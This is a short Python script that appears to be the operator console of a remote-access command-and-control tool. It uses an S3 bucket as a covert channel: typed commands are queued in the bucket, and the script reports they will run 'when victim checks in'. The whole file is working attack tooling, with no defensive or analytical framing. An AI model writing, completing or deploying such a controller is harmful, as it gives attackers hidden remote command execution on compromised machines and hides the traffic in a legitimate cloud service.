import os, sys
from cmd import Cmd
from S3Wrapper import S3Wrapper
from threading import Thread
from base64 import b64decode, b64encode


class MyPrompt(Cmd):
    def __init__(self):
        self.prompt = "shell> "
        self.intro = "Queue in commands to be executed"
        self.s3wrapper = S3Wrapper(BUCKET, KEY)
        self._start_server()
        Cmd.__init__(self)

    def _start_server(self):
        t = Thread(target=self.s3wrapper.start)
        t.daemon = True
        t.start()

    def do_exit(self, inp):
        print("Quitting..")
        return True

    def help_exit(self):
        print("Exit the application. Shortcut: Ctrl-D.")

    def emptyline(self):
        pass

    def default(self, input):
        if input == "exit":
            return self.do_exit(input)
        self.s3wrapper.send_data(input)
        print("Will execute %s when victim checks in " % input)

    do_EOF = do_exit
    help_EOF = help_exit


if __name__ == "__main__":
    BUCKET = "my-archives-packets-linux"
    KEY = "mypage"
    MyPrompt().cmdloop()
